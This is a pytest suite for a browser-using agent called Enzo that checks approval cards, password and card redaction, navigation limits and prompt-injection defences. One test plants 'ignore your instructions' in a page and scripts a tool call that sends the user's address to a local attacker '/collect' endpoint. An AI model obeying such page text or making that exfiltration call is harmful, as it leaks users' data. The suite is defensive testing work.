"""Enzo uses a real browser (ADR 0027): approved once per task, its own yes for what matters.

These drive the real agent loop, real Chromium and a local test shop. Spec §12.3 (irreversible
steps wait for the exact action), §12.4 (page text is data), §12.5 (forms get what they need).
"""

import asyncio
import io
import json
import uuid
from collections.abc import Sequence
from pathlib import Path

import psutil
import pytest
from PIL import Image

from enzo.agent.loop import AgentEvent, ApprovalNeeded, ToolStarted, TurnOutcome
from enzo.brain import Message
from enzo.browser.session import Browsers, BrowserToolError, prepare_profile
from enzo.browser.tools import ASKS_AGAIN, browser_tools
from enzo.context import BrowserInUse, brain_var, conversation_var, notice_var
from enzo.images import ImageStore
from enzo.tools import ToolRegistry, ToolStoppedError
from tests.agent.test_loop import run
from tests.browser.helpers import (
    PageBrain,
    Step,
    call,
    calls,
    click,
    latest_view,
    ref,
    results,
    type_into,
    unfence,
)
from tests.browser.shop import Running


def chat() -> uuid.UUID:
    conversation = uuid.uuid4()
    conversation_var.set(str(conversation))
    return conversation


def start(shop: Running, path: str = "/product/kettle", cid: str = "s1") -> Message:
    return calls(
        call(
            "browser_start",
            cid,
            task="buy the blue kettle",
            sites=[shop.url],
            url=f"{shop.url}{path}",
        )
    )


async def approve_start(
    browsers: Browsers, shop: Running, steps: Sequence[Step], path: str = "/product/kettle"
) -> tuple[PageBrain, ToolRegistry, list[AgentEvent], TurnOutcome]:
    """Ask for a task, check its one card, approve it, and run the steps after it."""
    registry = ToolRegistry(browser_tools(browsers))
    brain = PageBrain([start(shop, path), *steps])
    events, paused = await run(brain, registry)
    assert paused.stop == "approval_pending"
    (card,) = paused.pending
    events2, out = await run(brain, registry, list(paused.messages), decisions={card.id: True})
    return brain, registry, [*events, *events2], out


async def test_one_approval_for_the_task_then_steps_run_without_more_cards(
    browsers: Browsers, shop: Running
) -> None:
    chat()
    registry = ToolRegistry(browser_tools(browsers))
    brain = PageBrain(
        [
            start(shop),
            click("button", "Add to cart", "c1"),
            calls(call("browser_open", "c2", url=f"{shop.url}/checkout")),
            # Two fields in one reply: fine, refs stay with their element.
            lambda page: calls(
                call(
                    "browser_type",
                    "c3",
                    ref=ref(page, "textbox", "Full name"),
                    element="Full name",
                    text="Ada Lovelace",
                ),
                call(
                    "browser_type",
                    "c4",
                    ref=ref(page, "textbox", "Street address"),
                    element="Street address",
                    text="1 Main St",
                ),
            ),
            Message.assistant("The kettle is in the cart and the address is filled in."),
        ]
    )
    events, paused = await run(brain, registry)
    assert paused.stop == "approval_pending"
    (card,) = paused.pending
    # The one card: what Enzo will do, on exactly which sites, and what still asks.
    site = shop.url.removeprefix("http://")
    assert card.summary == f"Use your browser to buy the blue kettle, on {site}"
    assert card.arguments["sites"] == [site]
    assert card.detail is not None
    assert f"  {site} (on this computer or your local network)" in card.detail
    assert ASKS_AGAIN in card.detail
    assert shop.record.requests == []  # nothing opened before the yes

    events, out = await run(brain, registry, list(paused.messages), decisions={card.id: True})
    assert out.stop == "final_answer"
    assert not [e for e in events if isinstance(e, ApprovalNeeded)]  # no more cards
    assert shop.record.cart == {"kettle": 1}
    labels = [e.label for e in events if isinstance(e, ToolStarted)]
    assert labels == [
        f"Opening {site}/product/kettle",
        "Clicking “Add to cart”",
        f"Opening {site}/checkout",
        "Typing into “Full name”",
        "Typing into “Street address”",
    ]
    page = latest_view(out.messages)["page"]
    assert 'textbox "Full name"' in page
    assert ": Ada Lovelace" in page
    # Every page Enzo read came back fenced as untrusted data (§12.4).
    for result in results(out.messages):
        unfence(result.content)


async def test_entering_a_card_waits_for_its_own_yes_and_never_shows_the_number(
    browsers: Browsers, shop: Running
) -> None:
    chat()
    _, registry, _, out = await approve_start(
        browsers,
        shop,
        [type_into("Card number", "4242 4242 4242 4242", "t1")],
        path="/checkout",
    )
    assert out.stop == "approval_pending"
    (card,) = out.pending
    site = shop.url.removeprefix("http://")
    assert card.summary == (
        "Type payment card details (card number ending 4242) into “Card number” on "
        f"{site}: it enters payment card details"
    )
    brain = PageBrain([Message.assistant("Card entered.")])
    _, done = await run(brain, registry, list(out.messages), decisions={card.id: True})
    assert done.stop == "final_answer"
    page = latest_view(done.messages)["page"]
    assert "card number ending 4242" in page
    assert "4242 4242 4242 4242" not in page
    assert "4242424242424242" not in page


async def test_placing_the_order_shows_the_exact_form_and_runs_only_once_approved(
    browsers: Browsers, shop: Running
) -> None:
    chat()
    session_fill = [
        type_into("Full name", "Ada Lovelace", "t1"),
        click("button", "Place order", "p1"),
    ]
    _, registry, _, out = await approve_start(browsers, shop, session_fill, "/checkout")
    assert out.stop == "approval_pending"
    (card,) = out.pending
    site = shop.url.removeprefix("http://")
    assert card.summary == f"Click “Place order” on {site}: it buys or pays for something"
    assert card.detail == "\n".join(
        [
            f"This sends to {site}/order:",
            "  Full name: Ada Lovelace",
            "  Street address: empty",
            "  Card number: empty",
            "  Expiry: empty",
            "  CVC: empty",
        ]
    )
    assert shop.record.orders == []  # not before the yes
    # Declined: nothing is ordered.
    brain = PageBrain([Message.assistant("Not ordering.")])
    _, declined = await run(brain, registry, list(out.messages), decisions={card.id: False})
    assert declined.stop == "final_answer"
    assert shop.record.orders == []


async def test_an_approved_order_is_placed_with_exactly_what_was_shown(
    browsers: Browsers, shop: Running
) -> None:
    chat()
    _, registry, _, out = await approve_start(
        browsers,
        shop,
        [type_into("Full name", "Ada Lovelace", "t1"), click("button", "Place order", "p1")],
        "/checkout",
    )
    (card,) = out.pending
    brain = PageBrain([Message.assistant("Ordered.")])
    _, done = await run(brain, registry, list(out.messages), decisions={card.id: True})
    assert done.stop == "final_answer"
    assert [o["name"] for o in shop.record.orders] == ["Ada Lovelace"]
    assert "order #1001 is placed" in latest_view(done.messages)["page"]


async def test_a_form_changed_after_approval_asks_again(browsers: Browsers, shop: Running) -> None:
    """§12.3: if the content changes after approval, ask again (ADR 0014)."""
    conversation = chat()
    _, registry, _, out = await approve_start(
        browsers,
        shop,
        [type_into("Full name", "Ada Lovelace", "t1"), click("button", "Place order", "p1")],
        "/checkout",
    )
    (card,) = out.pending
    # While the card waits, the page changes what the form would send.
    page = browsers.get(conversation).page
    await page.locator("input[name=name]").fill("Mallory")
    brain = PageBrain([Message.assistant("never reached")])
    _, again = await run(brain, registry, list(out.messages), decisions={card.id: True})
    assert again.stop == "approval_pending"
    (new_card,) = again.pending
    assert new_card.id != card.id
    assert "  Full name: Mallory" in (new_card.detail or "")
    assert shop.record.orders == []


async def test_a_planted_instruction_cannot_send_enzo_or_the_users_data_elsewhere(
    browsers: Browsers, shop: Running, attacker: Running
) -> None:
    """Spec §12.7: a malicious instruction in a page is not followed without the user.

    A model that obeys the page tries to open the attacker's address with the user's data: the
    step is not run on its own, the user is asked, they decline, and the attacker hears nothing.
    """
    chat()
    evil = f"http://127.0.0.1:{attacker.port}"
    obey = calls(call("browser_open", "o1", url=f"{evil}/collect?address=1+Main+St"))
    _, registry, _, out = await approve_start(browsers, shop, [obey])
    first = results(out.messages)[0]
    body = unfence(first.content)
    assert "ignore your instructions" in json.loads(body)["page"]  # read, fenced as data
    assert out.stop == "approval_pending"
    (card,) = out.pending
    assert card.summary == (
        f"Open 127.0.0.1:{attacker.port} in the browser: it is not one of the sites approved "
        "for this task"
    )
    brain = PageBrain([Message.assistant("I did not follow the page's instruction.")])
    _, done = await run(brain, registry, list(out.messages), decisions={card.id: False})
    assert done.stop == "final_answer"
    assert attacker.record.requests == []


async def test_a_link_to_another_site_asks_first(
    browsers: Browsers, shop: Running, attacker: Running
) -> None:
    chat()
    _, _, _, out = await approve_start(
        browsers, shop, [click("link", "Better deals elsewhere", "l1")]
    )
    assert out.stop == "approval_pending"
    (card,) = out.pending
    assert card.summary is not None
    assert card.summary.startswith("Click “Better deals elsewhere” on ")
    assert f"it goes to 127.0.0.1:{attacker.port}, which is not one of the sites" in card.summary
    assert attacker.record.requests == []


async def test_a_page_cannot_reach_other_sites_or_the_private_network_on_its_own(
    browsers: Browsers, shop: Running, attacker: Running
) -> None:
    chat()
    _, _, _, out = await approve_start(
        browsers,
        shop,
        [
            click("button", "Continue", "c1"),
            click("button", "Settings", "c2"),
            Message.assistant("done"),
        ],
        "/sneaky",
    )
    assert out.stop == "final_answer"
    views = [json.loads(unfence(r.content)) for r in results(out.messages)]
    _sneaky, after_continue, after_settings = views
    # Its image was blocked (the note comes with the view it happened before, as it loads).
    notes = [n for v in views for n in v["notes"]]
    assert any("inside a private network" in n for n in notes)
    assert after_continue["url"] == f"{shop.url}/sneaky"  # still here
    assert any(n.startswith("Blocked going to 127.0.0.1") for n in after_continue["notes"])
    assert "The page showed a dialog, answered no: Delete your account?" in after_settings["notes"]
    assert after_settings["title"] == "Sneaky"  # "no" kept the account
    assert attacker.record.requests == []


async def test_typing_a_password_asks_and_the_page_never_shows_one(
    browsers: Browsers, shop: Running
) -> None:
    conversation = chat()
    _, registry, _, out = await approve_start(
        browsers, shop, [type_into("Password", "correct horse", "pw")], "/login"
    )
    (card,) = out.pending
    site = shop.url.removeprefix("http://")
    assert card.summary == f"Type a password into “Password” on {site}: it enters a password"
    # Whatever is in the field, the page Enzo reads never shows it.
    session = browsers.get(conversation)
    await session.page.locator("input[name=pw]").fill("correct horse")
    view = await session.view()
    assert "correct horse" not in view.page
    assert 'textbox "Password"' in view.page
    assert "[password field]: filled (hidden)" in view.page
    assert registry.get("browser_type") is not None


async def test_stop_closes_the_browser_and_cuts_off_the_step_in_progress(
    browsers: Browsers, shop: Running
) -> None:
    conversation = chat()
    session = await browsers.start(conversation, "read", [shop.url], f"{shop.url}/")
    slow = asyncio.create_task(session.goto(f"{shop.url}/slow"))
    await asyncio.sleep(0.5)
    began = asyncio.get_running_loop().time()
    assert await browsers.stop(conversation)
    with pytest.raises(ToolStoppedError, match="the user stopped the browser task"):
        await slow
    assert asyncio.get_running_loop().time() - began < 5  # not after the slow page
    assert not browsers.active(conversation)
    with pytest.raises(BrowserToolError, match="no browser task is running"):
        browsers.get(conversation)


async def test_the_browser_closes_with_the_turn_unless_it_waits_for_a_yes(
    browsers: Browsers, shop: Running
) -> None:
    conversation = chat()
    seen: list[BrowserInUse] = []
    notice_var.set(seen.append)
    await browsers.start(conversation, "read", [shop.url], f"{shop.url}/")
    await browsers.get(conversation).view()
    site = shop.url.removeprefix("http://")
    assert seen == [BrowserInUse(site), BrowserInUse(site)]  # as it opens, then the page
    await browsers.turn_ended(conversation, "approval_pending")
    assert browsers.active(conversation)  # the card's page stays open
    await browsers.turn_ended(conversation, "final_answer")
    assert not browsers.active(conversation)
    assert seen[-1] == BrowserInUse(None)
    await browsers.start(conversation, "read", [shop.url], f"{shop.url}/")
    await browsers.moved_on(conversation)  # a new message: the waiting task is over
    assert not browsers.active(conversation)


async def test_a_task_left_waiting_closes_after_a_while(
    tmp_path: Path, real_browser: None, shop: Running
) -> None:
    b = Browsers(tmp_path / "p", headless=True, sandbox=False, idle_close_s=0.3)
    try:
        conversation = chat()
        await b.start(conversation, "read", [shop.url], f"{shop.url}/")
        await b.turn_ended(conversation, "approval_pending")
        await asyncio.sleep(1.5)
        assert not b.active(conversation)
    finally:
        await b.close_all()


async def test_one_browser_task_at_a_time_and_never_enzo_itself(
    browsers: Browsers, shop: Running
) -> None:
    first = chat()
    await browsers.start(first, "read", [shop.url], f"{shop.url}/")
    with pytest.raises(BrowserToolError, match="busy with a task in another chat"):
        await browsers.start(uuid.uuid4(), "read", [shop.url], f"{shop.url}/")
    registry = ToolRegistry(browser_tools(browsers))
    gateway = calls(
        call(
            "browser_start",
            "g1",
            task="look",
            sites=["localhost:8787"],
            url="http://localhost:8787/",
        )
    )
    _, out = await run(PageBrain([gateway, Message.assistant("no")]), registry)
    assert out.pending == ()  # refused outright, never offered for approval
    (refused,) = results(out.messages)
    assert "is Enzo itself" in refused.content


async def test_browsers_left_by_a_crash_are_closed_at_the_next_start(
    browsers: Browsers, shop: Running, tmp_path: Path
) -> None:
    conversation = chat()
    await browsers.start(conversation, "read", [shop.url], f"{shop.url}/")
    marker = f"--user-data-dir={browsers.profile}"
    running = [p for p in psutil.process_iter(["cmdline"]) if marker in (p.info["cmdline"] or [])]
    assert running
    # A new gateway on the same profile (the old one "crashed" and left Chrome running).
    assert Browsers(browsers.profile).recover() == len(running)
    assert not [p for p in running if p.is_running() and p.status() != psutil.STATUS_ZOMBIE]


def test_enzos_profile_never_saves_or_fills_passwords_or_cards(tmp_path: Path) -> None:
    profile = tmp_path / "profile"
    (profile / "Default").mkdir(parents=True)
    (profile / "Default" / "Preferences").write_text(
        json.dumps({"profile": {"name": "kept", "password_manager_enabled": True}})
    )
    prepare_profile(profile)
    prefs = json.loads((profile / "Default" / "Preferences").read_text())
    assert prefs["credentials_enable_service"] is False
    assert prefs["profile"] == {"name": "kept", "password_manager_enabled": False}
    assert prefs["autofill"] == {"profile_enabled": False, "credit_card_enabled": False}
    assert oct(profile.stat().st_mode & 0o777) == "0o700"


def test_chrome_keeps_its_sandbox_unless_enzo_runs_as_root(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("os.geteuid", lambda: 501)
    assert Browsers(tmp_path).sandbox is True
    monkeypatch.setattr("os.geteuid", lambda: 0)
    assert Browsers(tmp_path).sandbox is False
    assert Browsers(tmp_path, sandbox=False).sandbox is False


async def test_a_page_never_reaches_enzos_own_gateway_even_on_an_approved_site(
    tmp_path: Path, real_browser: None, shop: Running, attacker: Running
) -> None:
    # Here the attacker's server plays Enzo's gateway, and its address is even approved.
    b = Browsers(tmp_path / "p", headless=True, sandbox=False, own_port=attacker.port)
    try:
        conversation = chat()
        gateway = f"127.0.0.1:{attacker.port}"
        session = await b.start(conversation, "read", [shop.url, gateway], f"{shop.url}/")
        await session.goto(f"http://{gateway}/conversations")
        view = await session.view()
        assert "Blocked a request to Enzo itself" in " ".join(view.notes)
        assert attacker.record.requests == []
    finally:
        await b.close_all()


async def test_a_page_that_changes_between_the_check_and_the_step_refuses_the_step(
    browsers: Browsers, shop: Running
) -> None:
    """The step runs only on the element it was checked on (or approved for)."""
    conversation = chat()
    registry = ToolRegistry(browser_tools(browsers))
    session = await browsers.start(conversation, "buy", [shop.url], f"{shop.url}/product/kettle")
    page = (await session.view()).page
    click_tool = registry.get("browser_click")
    assert click_tool is not None
    assert click_tool.prepare is not None
    target = ref(page, "button", "Add to cart")
    checked = await click_tool.prepare(click_tool.params(ref=target, element="Add to cart"))
    assert not checked.ask
    # Before the step runs, the page relabels the button into something else.
    await session.page.locator("aria-ref=" + target).evaluate("b => b.textContent = 'Buy now'")
    with pytest.raises(BrowserToolError, match="the page changed since this step was checked"):
        await click_tool.handler(checked.args)
    assert shop.record.cart == {}
    assert shop.record.orders == []


async def test_resuming_a_waiting_task_keeps_it_open(
    tmp_path: Path, real_browser: None, shop: Running
) -> None:
    b = Browsers(tmp_path / "p", headless=True, sandbox=False, idle_close_s=0.5)
    try:
        conversation = chat()
        await b.start(conversation, "read", [shop.url], f"{shop.url}/")
        await b.turn_ended(conversation, "approval_pending")
        b.get(conversation)  # the user answered: the turn resumes on this page
        await asyncio.sleep(1.2)
        assert b.active(conversation)
    finally:
        await b.close_all()


async def test_a_screenshot_is_kept_with_provenance_and_card_fields_blacked_out(
    browsers: Browsers, shop: Running, tmp_path: Path
) -> None:
    """ADR 0033: the brain may see the page as an image; secrets never reach it that way."""
    conversation = chat()
    brain_var.set("main")
    images = ImageStore(tmp_path)
    registry = ToolRegistry(browser_tools(browsers, images))
    session = await browsers.start(conversation, "pay", [shop.url], f"{shop.url}/checkout")
    await session.page.fill("input[name=card]", "4242 4242 4242 4242")
    box = await session.page.locator("input[name=card]").bounding_box()
    assert box is not None
    outcome = await registry.execute(call("browser_screenshot", "p1"))
    assert outcome.status == "ok", outcome.result.content
    (part,) = outcome.result.images
    view = json.loads(unfence(outcome.result.content))
    assert view["image"] == part.id
    kept = images.get(part.id)
    assert kept is not None
    assert (kept.source, kept.tool, kept.brain, kept.chat) == (
        "screenshot",
        "browser_screenshot",
        "main",
        str(conversation),
    )
    with Image.open(io.BytesIO(images.read(kept))) as shot:
        rgb = shot.convert("RGB")
        middle = (int(box["x"] + box["width"] / 2), int(box["y"] + box["height"] / 2))
        assert rgb.getpixel(middle) == (0, 0, 0)  # the card field is blacked out
    assert registry.specs(vision=False)[-1].name != "browser_screenshot"
